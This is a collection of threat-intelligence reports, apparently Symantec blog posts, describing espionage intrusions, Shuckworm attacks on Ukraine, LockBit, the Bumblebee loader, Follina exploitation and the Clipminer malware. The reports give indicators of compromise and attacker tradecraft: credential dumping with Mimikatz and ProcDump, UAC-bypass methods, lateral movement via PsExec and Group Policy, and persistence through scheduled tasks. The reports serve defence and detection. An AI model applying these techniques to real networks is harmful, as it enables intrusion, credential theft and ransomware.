renamed version of Mimikatz that the attackers then used to dump credentials: On April 26, further malicious activity occurred when the attackers ran the Crash Handler executable and installed a file called cal.exe (SHA256: 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133) on the compromised machine. This file was LadonGo v3.8, apublicly available penetration testing frameworkthat is written in Go. The attackers appear to have used LadonGo to scan the internal network for machines with RDP services running and attempted to exploit or log in to those machines using the credentials they stole several days earlier. There was also some evidence of brute-force login attempts against machines of interest. On May 6, the attackers resumed their attack and ran the Crash Handler executable (this time named svchost.exe) and installed a new variant of Mimikatz named test.exe (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). This was likely done in order to obtain more credentials. The attackers then ran LadonGo and attempted to exploit a Netlogon vulnerability (CVE-2020-1472) against two other computers in the organization in order to elevate privileges. On May 16, the attackers increased their level of activity and began moving laterally across the organization’s network from the initially compromised computer (Computer #1). On a second computer (Computer #2), the attackers launched a command prompt and executed a variant of Mimikatz (file name: test.exe, SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). The attackers then deployed a number of Knowledge Base files (e.g. kb0394623.exe) on the computer. These files are legitimate copies of the Windows command prompt (with 16 bytes of the rich header modified). On a third computer (Computer #3) the attackers used PsExec to execute the same older version of Crash Handler used on Computer #1, this time named javac.exe. A copy of this executable was then made to csidl_program_files\\windows mail\\winmailservice.exe and was executed. The attackers then ran dnscmd.exe (SHA256: 67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc), which was used to enumerate DNS configuration information on the compromised computer: Dnscmdis a Microsoft command-line toolfor managing DNS servers. It can be used to script batch files to help automate routine DNS management tasks or to perform routine setup of new DNS servers. The enumzones command is used to list the zones that exist on the specified DNS server. If no filters are specified, a complete list of zones is returned. Crash Handler was then used to install imjpuex.exe in the csidl_common_appdata\\veritas directory which in turn was used to side-load a DLL file of the same name and load a .dat file to execute an unknown custom payload. Shortly after this, the attackers attempted to list the records of multiple specific zones by specifying the domain on the command line: On a fourth computer (Computer #4), the attackers used PsExec to execute Crash Handler (this time named test.exe). They then installed and executed two KB files in the %TEMP% directory. • SHA256: 5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda • SHA256: ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51 Again, both of these files were modified versions of the Windows command prompt. On May 17, the attackers deployed several more modified Windows command prompt applications on Computer #4. They also deployed the side-loading technique on Computer #5 to execute the legitimate svchost.exe application, possibly to facilitate some process injection. On May 19, the attackers returned to Computer #5 and used svchost to launch NetworkService. The attackers then used a variant of Mimikatz named calc.exe, which was previously used earlier in the attack (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). Mimikatz was used to dump credentials from the compromised host. On May 24, the attackers turned their attention to Computer #3, using PsExec to execute the whoami command and determine the currently logged-in user. They then ran an unknown batch file name t.bat via PsExec. It is likely the following commands were executed from this script in order to create a new user account: The script uses net.exe to check if a specific user account already exists. It then attempts to create a user account with the password Asd123.aaaa and add it to the local group on the machine. Several minutes later, the task manager was launched followed by a command prompt. The attackers then ran the following command to mount asnapshot of the active directory server. These snapshots contain sensitive information such as the active directory database (i.e. user credentials) and log files. The string c2b3e2c6-1ffb-4625-ba8e-3503c27a9fcb is the index number of the snapshot. The attackers then moved to Computer #5, where they used ProcDump (file name: p.exe, SHA256: 2f1520301536958bcf5c65516ca85a343133b443db9835a58049cd1694460424) to dump credentials from LSASS: On May 26, the attackers returned to Computer #1 and executed a file called go64.exe. This file was a copy of Fscan. The attackers ran the following command to mass scan for any machines within the compromised network (specifically a class C scan against machines in the IP range 10.72.0.0 → 10.72.0.255) with RDP services: There is also evidence that the attackers leveraged Fscan in order to perform exploit attempts against other machines on the network, including leveraging one of the ProxyLogon vulnerabilities (CVE-2021-26855) against an Exchange Server. Suspicious SMB activity also occurred around this time, suggesting the attackers may have also leveraged other exploits (likely EternalBlue) against any open SMB services. On June 6, the attackers ran PsExec on Computer #3 to launch the previously used old version of Crash Handler (file name: winnet.exe) from the %USERPROFILE%\\public\\ directory. They ran the Dnscmd utility again to enumerate all available zones, before executing winnet.exe again and a copy of Crash Handler located at APPDATA%\\t.exe to load additional malicious payloads (likely used to install ProcExplorer): Several hours later, ProcExplorer (64-bit) was launched: The last known malicious activity occurred on July 8 on Computer #3. The system hive file was dumped from the registry in order to dump user credentials. While this group of attackers was previously using ShadowPad, it has since moved on and has been deploying a range of payloads. One of the payloads used was a previously unseen, feature-rich information stealer (Infostealer. Logdatter), which appeared to be custom built. Its capabilities included: Other payloads used by the attackers included: ShadowPad is a modular RAT that was designed as a successor to the Korplug/PlugX Trojan and was, for a period of time, sold on underground forums. However, despite its origins as a publicly available tool, it has since been closely linked to espionage actors. The tool was only sold publicly for a very short period of time and it is believed that it was only sold to a handful of buyers. There is limited evidence to suggest links to past attacks involving the Korplug/PlugX malware and to attacks by a number of known groups, including Blackfly/Grayfly (APT41) and Mustang Panda. For example, the attackers leveraged a legitimate file called HPCustParticUI.exe, which was developed by HP for digital imaging applications. This previously occurred inattacks involving Korplug/Plug X. Furthermore, the attackers used a file called hpcustpartui.dll as a likely loader. The same loader was used ina long-running campaign involving Korplug/Plug X targeting the Roman Catholic Church. The current campaign uses a legitimate Bitdefender file to side-load shellcode. This same file and technique wereobserved in previous attacks linked to APT41. We have also observed the same keylogging tool deployed inprevious attacks against critical infrastructurein South East Asia. The use of legitimate applications to facilitate DLL side-loading appears to be a growing trend among espionage actors operating in the region. Although a well-known technique, it must be yielding some success for attackers given its current popularity. Organizations are encouraged to thoroughly audit software running on their networks and monitor for the presence of outliers, such as old, outdated software or packages that are not officially used by the organization.

    "text": "UPDATE, 17.40 BST, August 15, 2022: Update for clarity re use of VCD, ASC, and H264 file extensions in file names. UPDATE, 17.50 BST, August 17, 2022:Additional IOCs added Recent Shuckworm activity observed by Symantec, a division ofBroadcom Software, and aimed at Ukraine appears to be delivering information-stealing malware to targeted networks. This activity was ongoing as recently as August 8, 2022 and much of the activity observed in this campaign is consistent with activity that was highlighted byCERT-UAon July 26. The activity observed by Symantec began on July 15, and we have additional indicators of compromise (IOCs) and technical details to share about this campaign. Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. It is generally considered to be a state-sponsored espionage operation. The first suspicious activity Symantec saw on victim systems was a self-extracting 7-Zip file, which was downloaded via the system’s default browser. Subsequently, mshta.exe downloaded an XML file, which was likely masquerading as an HTML application (HTA) file. These files were downloaded from the following domain: a0698649[.]xsph[.]ru. It has been publicly documented since May 2022 that subdomains of xsph[.]ru are associated with Shuckworm activity, and this domain was once again mentioned in CERT-UA’s July 26 publication about Shuckworm activity. This domain was also associated with an email that spoofed being from the Security Service of Ukraine and had “Intelligence Bulletin” in the subject line, according to CERT-UA. This being the case, it is most likely the 7-Zip file seen on victim networks in the campaign observed by Symantec was delivered to victims via email. The downloading of the XML file onto victim networks was followed by the execution of a PowerShell stealer. We saw three versions of the same PowerShell stealer appear on the one system. It’s possible the attackers may have deployed multiple versions of the stealer, which were all very similar, as an attempt to evade detection. Two VBS downloaders that had the words “juice” and “justice” in their file names were also observed on victim machines. Analysis found that these were Backdoor. Pterodo, a well-known Shuckworm tool that Symantecblogged about earlier this year. These scripts are capable of calling PowerShell, uploading screenshots, and also executing code downloaded from a command-and-control (C&C) server. Various suspicious files containing “ntuser” in the file names were also seen on victim machines. We associate these “ntuser” files with Shuckworm activity, and many variants of them are malicious, with most detected as the Giddome backdoor, another well-known Shuckworm tool. We saw various parent processes with file names that had VCD, H264 and ASC extensions. A file namedntuser.dat.tmcontainer.vcdwas the parent process for a Giddome backdoor variant namedntuser.dat.tm.descendant.exethat was seen on victim machines. A suspicious file namedntuser.dat.tmcontainer.h264had a child process namedntuser.dat.tm.declare.exe, another malicious Giddome backdoor binary. Elsewhere, a file namedntuser.dat.tmcontainer.aschad a child process namedntuser.dat.tm.decay.exe. VCD files are disc images of a CD or DVD and are recognized by Windows as an actual disc, similar to ISO files, which we commonly see malicious actors use to deliver payloads. An ASC file is an encrypted file that may contain text or binary information encoded as text, while an H264 file is a video file. However, filenames with thentuser.dat.tmcontainerprefix are files that represent the registry. It’s not clear if these are the actual file types, or if the attackers are using these file names as a means of sowing confusion. The backdoor dropped on victim systems had the file name4896.exe. This backdoor had multiple capabilities, including: The legitimate remote desktop protocol (RDP) tools Ammyy Admin and AnyDesk were both also leveraged by the attackers for remote access. Legitimate RDP tools like these and others are frequently leveraged for remote access by attackers in both ransomware and nation-state-backed cyber attacks. This campaign, combined with previous public reporting on Shuckworm, shows some patterns in the operations of the group at the moment, including its reuse of patterns, e.g. paths (such as csidl_profile\\music), using files that contain \"ntuser.dat\" in the file name, using various artifacts that contain, for example, \"judgement\" in the file name, and also leveraging EXE files whose file names contain English words that begin with \"D\", “dat”, “decay”, “deer”, “declare”, etc. As the Russian invasion of Ukraine approaches the six-month mark, Shuckworm’s long-time focus on the country appears to be continuing unabated. That this recent activity continues even after CERT-UA documented it shows that fear of exposure does not deter the group from its activities. While Shuckworm is not necessarily the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations.

    "text": "Symantec, a division ofBroadcom Software, has observed threat actors targeting server machines in order to spread the LockBit ransomware threat throughout compromised networks. In one attack observed by Symantec, LockBit was seen identifying domain-related information, creating a Group Policy for lateral movement, and executing a \"gpupdate /force\" command on all systems within the same domain, which forcefully updates group policy. LockBit is a ransomware-as-a-service (RaaS) operated by malicious actors Symantec tracks as Syrphid. Shortly after it first appeared in September 2019, the Syrphid gang expanded its operations, using a network of affiliates to deploy the LockBit ransomware on victim networks. The ransomware, which has currently reachedversion 3.0, has evolved over the past few years, as has its operators who have recentlylaunched a bug bounty programin order to weed out weaknesses in the malware’s code and the RaaS operation as a whole. In one observed instance, before dropping and executing the LockBit ransomware, an attacker had RDP access to the enterprise network for a couple of weeks at least. This access may have been obtained through remote desktop applications such as AnyDesk or Windows RDP, or by exploiting a known vulnerability, etc. LockBit behaves differently on server machines with domain controllers than on Windows 10 machines. When executed on a server, it has the capability to spread through the network using Group Policy. On Windows 10 machines it performs routine ransomware activity and encrypts files. When LockBit is executed on a server machine it carries out the following actions: 3. End running processes and disable services 4. Privilege escalation A. Exploiting USERENV.dll to bypass UAC B. Bypass method in hfiref0x’s UACME C. Exploiting the ICMLuaUtil elevated COM Interface-Object 6. LockBit creates a copy of itself under the SYSVOL directory “c:\\windows\\sysvol\\domain\\scripts\\< Lockbit executable>” 7. Creating a Group Policy: Computer configurations: 9. Executes gpupdate command on the domain controller where LockBit is running. Also runs gpupdate to run policies from the computer configurations and user configurations. 12. Encrypts files and appends the .lockbit file extension. LockBit has been one of, if not the most active of RaaS gangs in 2022. The drop in Conti activity in May helped LockBit reach the top spot, with some reports stating that the threat was behind as much as40% of ransomware attacks. LockBit’s success is also due to its developers and affiliates continued evolution of features and tactics, which include the malware’sfast encryption speed, ability to target both Windows andLinux machines, itsbrash recruitment drives, andhigh-profile targets. In addition, as previously mentioned, the launch of a rewards program for vulnerabilities in LockBit’s code and for suggestions on improving the RaaS operation will no-doubt help the ransomware remain a serious threat to organizations. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies. Intrusion Prevention System (IPS) Protection Symantec Data Center Security (DCS) hardening policies for Windows Servers and Domain Controllers prevent LockBit ransomware installation. The default DCS lockdown prevents lateral movement of LockBit ransomware on the network and protects servers from LockBit execution attempts to tamper with Group Policies and critical system resources.

    "text": "Bumblebee, a recently developed malware loader, has quickly become a key component in a wide range of cyber-crime attacks and appears to have replaced a number of older loaders, which suggests that it is the work of established actors and that the transition to Bumblebee was pre-planned. By analysis of three other tools used in recent attacks involving Bumblebee, Symantec’s Threat Hunter team, a part ofBroadcom Software, has linked this tool to a number of ransomware operations including Conti, Quantum, and Mountlocker. The tactics, techniques, and procedures (TTPs) used in these older attacks support the hypothesis that Bumblebee may have been introduced as a replacement loader for Trickbot and BazarLoader, since there is some overlap between recent activity involving Bumblebee and older attacks linked to these loaders. A recent attack involving the Quantum ransomware demonstrates how Bumblebee is now being leveraged by attackers to deliver ransomware. The initial infection vector was a spear-phishing email with an attachment containing an ISO file. This ISO file contained a Bumblebee DLL file and an LNK file, which loaded the Bumblebee DLL file using rundll32.exe. Bumblebee supports multiple commands like “Ins” for bot persistence, “Dij” for DLL injection, and “Dex” for downloading executables. Bumblebee contacted a command-and-control (C&C) server (45.153.243.93) and created a copy in the %APPDATA% folder with a random name, and also created a VBS file at the same location to load the %APPDATA% DLL file. A scheduled task was created using the Bumblebee “Ins” command to run a VBS file every 15 minutes. After a couple of hours, Bumblebee used the “Dex” command to drop and run a Cobalt Strike payload named “wab.exe” in the %APPDATA% location. It also ran the “systeminfo” command. Using the “Dij” command, Bumblebee then injected the Metasploit DLL into the legitimate process “ImagingDevices.exe”, which is a Windows Photo Viewer executable file. In addition to this, using the “Dij” command Bumblebee injected the Cobalt Strike payload into the legitimate “wab.exe”, which is a Windows Mail executable file. Bumblebee then dropped the AdFind tool using the “Dij” command and tried to enumerate domain-related information like domain trust, domain users, domain groups, and group permissions, etc. At this point, Bumblebee dropped the Quantum ransomware using the “Dij” command. The attacker used both DLL and EXE payloads to encrypt files. Quantum collects system information and user information using WMI. It also checks for SQL-related services and stops them if found running. Quantum also checks for some processes related to malware analysis like procmon, wireshark, cmd, task manager, and notepad, and terminates them if found running. Tools used in recent Bumblebee attacks have appeared in older attacks, pre-dating Bumblebee’s appearance. In a number of attacks involving Bumblebee beginning in mid-May 2022, a version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682) was also deployed by the attackers. AdFind is a publicly available tool for querying Active Directory and has been widely used by a range of threat actors in recent years. Similar to the previously mentioned example, malicious ISO files attached to phishing emails were the initial infection vector, with the attackers deploying legitimate ConnectWise remote desktop software (formerly known as ScreenConnect), along with Atera, another legitimate remote access tool, and Meterpreter, a Metasploit in-memory payload that provides a reverse shell to the attacker. In all cases, the attacks never reached the payload stage. However, similarities TTPs used in other attacks suggest that ransomware was the intended payload. This version of AdFind used in these recent Bumblebee attacks has appeared in attacks dating back as far as June 2021, where it was being used in conjunction with Cobalt Strike to deliver the Avaddon ransomware. In August 2021, it reappeared during an unsuccessful ransomware attack when it was used alongside a number of other legitimate software packages including AnyDesk, a publicly available remote desktop tool; Splashtop, another remote desktop tool; and 7-Zip, the publicly available archiving tool. The attack was halted before a ransomware payload could be deployed. During another abortive ransomware attack in May 2022, this variant of AdFind was also deployed. Again, the attackers used Atera in conjunction with Splashtop and AnyDesk. The widely used credential dumping tools Mimikatz and LaZagne were deployed, along with the NetScan network scanner. The attackers also made use of a PowerShell script named cve-2021-34527.ps1 that has previously been linked to Conti’s leaked attack playbook. This version of AdFind also appeared in attacks involving Quantum ransomware during May 2022. The attackers also used Cobalt Strike; Ligolo, a publicly available tunneling tool created for penetration testing purposes, but which has been used by a number of espionage and ransomware actors; ProcDump for credential dumping; along with Rclone, a legitimate open-source tool that can legitimately be used to manage content in the cloud, but is frequently used by ransomware actors to exfiltrate data. More recently, this same version of AdFind was used in an attack attempting to deliver the Diavol payload. The initial loader used by the attackers was not discovered, but the AdFind link with Bumblebee activity suggests it may have been used by the attackers. In early June 2022, Bumblebee was used in a thwarted attack. Although the payload wasn’t deployed, the TTPs used suggested ransomware. The attackers made use of a batch script called adf.bat (SHA256: 1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb) along the previously mentioned version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682) and another version of AdFind (SHA256: 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda). This adf.bat script has been used in attacks since at least 2021. In September 2021, for example, the file was deployed in what appeared to be an attempted ransomware attack. It was used in conjunction with the previously mentioned version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682); Cobalt Strike; and PowerSploit, an exploitation framework originally developed for penetration testing. The script was also used in another thwarted ransomware attack in November 2021, again alongside the previously mentioned version of AdFind. Once again the attackers used a number of publicly available tools, including Atera agent and Splashtop, along with Cobalt Strike. While the delivery mechanism wasn’t uncovered, some of the infrastructure used had been previously linked to infrastructure used by BazarLoader, which along with Trickbot, was one of the primary pieces of malware used by the Miner cyber-crime group (aka Wizard Spider). Both were frequently used as part of the delivery mechanism for the group’s ransomware families: Ryuk and Conti. A third version of AdFind (SHA256: 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda) has also been used in recent attacks involving Bumblebee. This tool has been used in ransomware attacks for at least a year. In May 2021, it was used alongside Cobalt Strike in an attempted ransomware attack against a large electronics organization. One feature of this attack was that the attackers installed a VirtualBox VM on some compromised computers. While a VM image was not retrieved, it appeared that the ransomware payload was located on the VM and ran once the operating system was fully booted. The VM likely had access to the host computer’s files and directories (via \"SharedFolders\" set up by runner.exe), allowing it to encrypt files on the host computer. While the payload wasn’t identified, there were some links to both the Conti and Mountlocker ransomware operations. In another May 2021 attack it was again used in conjunction with Cobalt Strike in another abortive ransomware attack against an organization in the U. S. While the payload was not deployed, some of the TTPs had links to earlier Conti attacks. Also in May 2021, this version of AdFind was leveraged along with Cobalt Strike in an attack against an organization in Canada. In this case, the Conti ransomware was used. Aside from Bumblebee’s links to a range of ransomware attacks, another commonality between many of the attacks investigated is the preponderance of legitimate software tools now being deployed during ransomware attacks. Remote desktop tools such as ConnectWise, Atera, Splashtop, and AnyDesk frequently feature in ransomware investigations, in addition to Rclone, which is now widely leveraged for data exfiltration purposes. More recently, Symantec has seen attackers using the AvosLocker ransomware leveraging PDQ Deploy in their attacks. PDQ Deploy is a legitimate software package that allows users to manage patching on multiple software packages in addition to deploying custom scripts. At least one affiliate of AvosLocker is now using it to execute malicious PowerShell commands on multiple computers on victims’ networks using PowerShell Empire to deploy the AvosLocker payload. Bumblebee’s links to a number of high-profile ransomware operations suggest that it is now at the epicenter of the cyber-crime ecosystem. Any organization that discovers a Bumblebee infection on its network should treat this incident with high priority since it could be the pathway to several dangerous ransomware threats. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 6804cff68d9824efeb087e1d6ff3f98ed947f002626f04cf8ae7ef26b51e394b – Bumblebee daf055e5c7f843a3dbe34c3c7b848e5bbe9c53b65df2556b4b450390154af3bb - Bumblebee 7259b7a91df7c9bc78b0830808fe58c6ff66aa79bb856cf1bf50a107875b3651 – Bumblebee ac20f3f9ed0c1e6b2160976a1dc4167e53fbb8c71b4824a640131acf24c71bfd - Bumblebee 71f91acc6a9162b600ff5191cc22f84a2b726050a5f6d9de292a4deeea0d9803 – Bumblebee f06566e1e309123e03a6a65cdfa06ce5a95fdd276fb7fcbcb33f5560c0a3cd8c – Cobalt Strike 2e349b3224cc0d958e6945623098c2d28cc8977e0d45480c0188febbf7b8aa78 – Bumblebee 302a25e21eea9ab5bc12d1c5f9e5c119619e617677b307fe0e3044c19581faea – Likely Bumblebee 65e205b500160cbec44911080621d25f02ad7fcfcf2c3e75ce33f6f821a808b8 - Bumblebee-related DLL 905e87d8433fa58f3006ee685bb347024b46550a3ceda0777016f39e88519142 - Bumblebee-related DLL 6727d493d4ecc8cca83ed8bf7af63941175decff7218e599355065ae6c9563c4 - Bumblebee-related DLL c8db63bfab805179a1297f8b70a90a043581c9260e8c97725f4920ab93c03344 - Bumblebee-related DLL 261b06e30a4a9960e0b0ae173486a4e456c9bd7d188d0f1c9c109bb9e2281b59- Bumblebee-related DLL 24bf01c1a39c6fcab26173e285d226e0c2dcd8ebf86f820f2ba5339ac29086e5 - Bumblebee-related DLL 86d7f7b265aae9eedb36bc6a8a3f0e8ec5fa08071e2e0d21774a9a8e3d4ed9e7 - Bumblebee-related DLL 4c3d85e7c49928af0f43623dcbed474a157ef50af3cba40b7fd7ac3fe3df2f15 – Unconfirmed, possible VM detection tool b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682 - AdFind 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda - AdFind af.bat 1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb – af.bat adf.bat 5a1b3f9589b468a06e9427eae6b0a855d1df6cb35ab71ddbfa05279579e9cda3 – adf.bat ee5fbc193f875a2b8859229508ca79a2ffe19d8a120ae8c5ca77b1d17233d268 - wab.exe 5ad4fa74e71fb4ce0a885b1efb912a00c2ce3c7b4ad251ae67e6c3a8676ede02 - wabmig.exe 02ea7b9948dfc54980fd86dc40b38575c1f401a5a466e5f9fbf9ded33eb1f6a7 - wabmig.exe b722655b93bcb804802f6a20d17492f9c0f08b197b09e8cd57cf3b087ca5a347 - imagingdevices.exe a60136d7377bc1ba8c161021459e9fe9f49c692bf7b397fea676211a2da4444d – Malicious MSI file 86c564e9fb7e45a7b0e03dd5a6e1c72b7d7a4eb42ebe6aa2e8f8a7894bed4cb5 – VBS file 1825e14e1ea19756b55b5ccec5afbb9c2dba0591403c553a83c842bb0dd14432 - ConnectWise 3dea930cfb0ea48c2ce9f7a8bd98ee37e2feca5fb4da8844890fa2d4f62dd105 - Atera 52f145a4ccc0f540a130bedbf04370a842daff1ee8d8361c75a8e0d21a88cf5a - Atera update.exe 3b7512cfa21bd65bd5beecc8cb859ab4f7f5538f3caaf0703a68ec14389b357a - ConnectWise 4c6a865771fdb400456b1e8bc9198134ac9d2f66f1654af42b4b8fc67ae018f2 - ConnectWise fef7d54d6c09a317d95300d10ffcc6c366dbb8f5ebf563dec13b509fff361dc1 - ConnectWise 165b491e5b9e273a61c16de0f592e5047740658c7a2e3047f6bf518a17e59eca - ConnectWise a8faf08997e11a53f9d38797d997c51c1a3fcf89412c3da8dcca6631c6f314a8 - ConnectWise 01e22210e07708c0b9a0061d0f912041808e48bb8d59f960b545d0b9e11d42d2 - ConnectWise f5218aaa046776a12b3683c8da4945a0c4c0934e54802640a15152d9dae15d43 - ConnectWise bc41569c4c9b61f526c78f55993203806d09bb8c3b09dbbeaded61cd1dc2fcc2 - caexec.exe (likely similar to PAExec) 29767c912919cb38903f12c7f41cdd1c5f39fccb9641302c97b981e4b5e31ee5 - vSphere PowerCLI component 911c152d4e37f55bd1544794cc324364b6f03aff118cdf328127355ccc25282a - vSphere PowerCLI component f5cd44f1d72ef8fc734c76ca62879e1f1cb4c0603cfdc0b85b5ad6ad8326f503 - vSphere PowerCLI component 0650722822e984da41d77b90fbd445f28e96a90af87043581896465c06ed1e44 – ConnectWise f01a3f2186e77251acfac9d53122a1579182bde65e694487b292a8e09cf8d465 – Cobalt Strike 290b698d41525c4c74836ca934c0169a989a5eafde7208d90300a17a3f5bd408 – Ransom.

    "text": "Symantec, a division ofBroadcom Software, has observed threat actors exploiting the remote code execution (RCE) vulnerability known as Follina to drop malware onto vulnerable systems just days after the flaw became public on May 27, 2022. Follina (CVE-2022-30190) is a vulnerability in the Microsoft Support Diagnostic Tool (MSDT) that allows remote code execution on vulnerable systems through the ms-msdt protocol handler scheme. The bug is present in all supported versions of Windows. The vulnerability can be easily exploited by a specially crafted Word document that downloads and loads a malicious HTML file through Word’s remote template feature. The HTML file ultimately allows the attacker to load and execute PowerShell code within Windows. The vulnerability can also be exploited through the RTF file format. Exploiting the flaw does not require the use of macros, eliminating the need for an attacker to trick victims into enabling macros for an attack to work. Microsoft has since released advisories and workarounds to mitigate the vulnerability. Since the details of the vulnerability started surfacing online, attackers were quick to start taking advantage of the flaw to install their payloads. Symantec has observed attackers using a similar HTML file to that used in the initial attack. When the HTML document is executed in the context of WinWord, msdt.exegets spawned as a child process. That is because of the protocol handler entry in the registry. Sdiagnhost.exe is then invoked, which is the Scripted Diagnostics Native Host, and under this process the final payload process is created - in our case PowerShell. Multiple attackers are using a variety of payloads at the end of successful exploitation. In one of the instances, Symantec observed the attackers deploying the remote access Trojan AsyncRAT, which had a valid digital signature. When AsyncRAT runs, it carries out the anti-analysis checks shown in Figure 4. Later, AsyncRAT collects information about the infected system, including hardware identification, user name, executed path, and operating system information, and sends it to a command-and-control (C&C) server. AsyncRAT then waits for commands from the C&C server and executes those commands on the victim machine. Symantec has also observed attackers deploying an information stealer as a payload. The code shown in Figure 6 is a snippet from the malware, which steals information including cookies and saved login data from web browsers such as Firefox, Chrome, and Edge.

    "text": "Symantec’s Threat Hunter Team, a part ofBroadcom Software, has uncovered a cyber-criminal operation that has potentially made the actors behind it at least $1.7 million in illicit gains from cryptocurrency mining and theft via clipboard hijacking. The malware being used, tracked by Symantec as Trojan. Clipminer, has a number of similarities to another crypto-mining Trojan calledKryptoCibule, suggesting it may be a copycat or evolution of that threat. Clipminer is likely spread via Trojanized downloads of cracked or pirated software. The malware arrives on compromised computers as a self-extracting WinRAR archive that drops and executes a downloader in the form of a packed portable executable DLL file with CPL file extension (although it does not follow the CPL format). The dropped file connects to the Tor network to download Clipminer’s components. Clipminer has the ability to use compromised computers’ resources to mine for cryptocurrency. The malware also modifies the clipboard content in an attempt to redirect cryptocurrency transactions by users of the infected computer. On each clipboard update, it scans the clipboard content for wallet addresses, recognizing address formats used by at least a dozen different cryptocurrencies. The recognized addresses are then replaced with addresses of wallets controlled by the attacker. For the majority of the address formats, the attackers provide multiple replacement wallet addresses to choose from. The malware then picks the address that matches the prefix of the address to be replaced. This way, the victim is less likely to notice manipulation and is likely to proceed with the transaction. The malware includes a total of 4,375 unique addresses of wallets controlled by the attacker. Out of these, 3,677 addresses are used for just three different formats of Bitcoin addresses. Investigating just Bitcoin and Ethereum wallet addresses, we found that they, at the time of writing, contained approximately 34.3 Bitcoin and 129.9 Ethereum. However, some funds had also been transferred to what appear to be cryptocurrency tumblers, also known as cryptocurrency mixing services. These services mix potentially identifiable funds with others, so as to obscure the trail back to the fund's original source. If we include the funds transferred out to these services, the malware operators have potentially made at least $1.7 million from clipboard hijacking alone. The infection chain begins with a self-extracting WinRAR archive (bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71) that drops and executes the masqueraded Control Panel (CPL) file: The dropped file is actually a downloader in the form of a packed portable executable DLL, which has the following exports: Once the sample is executed, it arranges for itself to start again in case it gets interrupted. To do so, it renames itself using the following format: It also creates the following registry value: (Note the extra DOT at the end of the filename) Example corresponding registry value: Both of these will be deleted by the sample once it successfully downloads and installs its payload. Next, the malware starts an embedded Tor client by downloadingTor consensus data: Where [HOST_IP_AND_PORT] is picked from a list embedded by the sample. The malware then connects to the Tor network. Next, it collects details from the affected computer, as shown in the following example: [PUBLIC_IPv4_ADDRESS_AS_SEEN_ON_INTERNET];[REDACTED];\"Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz\";L\"\\x005CDevice\\x005CHarddiskVolume3\\x005CWindows\\x005CSystem32\\x005Crundll32.exe\",L\"\\x005CDevice\\x005CHarddiskVolume3\\x005CWindows\\x005CSysWOW64\\x005Crundll32.exe\",L\"C\\x003A\\x005CUsers\\[REDACTED]\\x005CAppData\\x005CLocal\\x005CTemp\\x005CM5aK8iW.cpL\";\"BC711 NVMe SK hynix 128GB[REDACTED];L\"Windows Defender\":61100;\"PCI\\[REDACTED]\":\"Intel(R) UHD Graphics; 630\":1920:1200:59;113:[LIST_OF_RUNNING_PROCESSES];1920:1200:[DESKTOP_SCREENSHOT_AS_BASE64_ENCODED_PNG]; It then sends the following HTTP GET request to an Onion Service over Tor: Where [BINARY_AS_BASE64_ENCODED] is a blob that appears to contain details of the infected machine, and [ONION_SERVICE_AND_PORT] is one of the following: Note that the above are v2 Onion Services. In 2021, v2 Onion Services were depreciated and are no longer supported by current versions of Tor. However, many nodes on the Tor network have yet to be upgraded, meaning the services are still reachable. The received response is roughly 10 MB in size and contains the Clipminer payload, which is used to perform coin mining and clipboard hijacking on the compromised computer. The payload is stored in the following location: Where [EXISTING_TOP_DIRECTORY] is one of the following: The following is an example of the location and directory naming convention used by the malware: It also populates the two newly created directories with files copied from the local machine so that the malicious files are less likely to stand out. It then drops the load point to the inner directory, where file hash, file directory, and file name vary: Then it creates scheduled tasks (similar to the following examples) to execute the load point for persistence (details vary between runs): URI: \\Microsoft\\Windows\\Active Directory Rights Management Services Client\\Microc040e Command: C:\\Windows\\Microsoft. NET\\Framework\\v4.0.30319\\RegAsm.exe Arguments: /u \"C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices\\imsgt_dvepr.dll\" WorkingDirectory: C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices It creates the following empty registry key (likely as an infection marker): The loaded payload starts a v3 Onion Service (the address changes per infection). We also observed traces of another v3 Onion Service (possibly used to ping the attackers whenever the compromised machine comes online). The payload will monitor keyboard and mouse activity to determine if the machine is in use. It also appears to monitor running processes, checking for analysis/troubleshooting tools. Whenever the malware determines that a machine is not in use (and at least some of the troubleshooting tools are not used), it starts the XMRig cryptocurrency miner. There are some indications that the attackers used a different miner in the past. Also, it is very likely that a different miner is used when a dedicated GPU is available (e.g. NVIDIA graphics card). We also observed what looks like an XMRig command line (used during injection): The sample includes a list of IPv4 addresses and picks two each time. There is also an example JSONRPC request in memory (before encryption): {\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"login\":\"x\",\"pass\":\"x\",\"agent\":\"app/1 (Windows NT 10.0; Win64; x64) libuv/1.41.0 msvc/2019 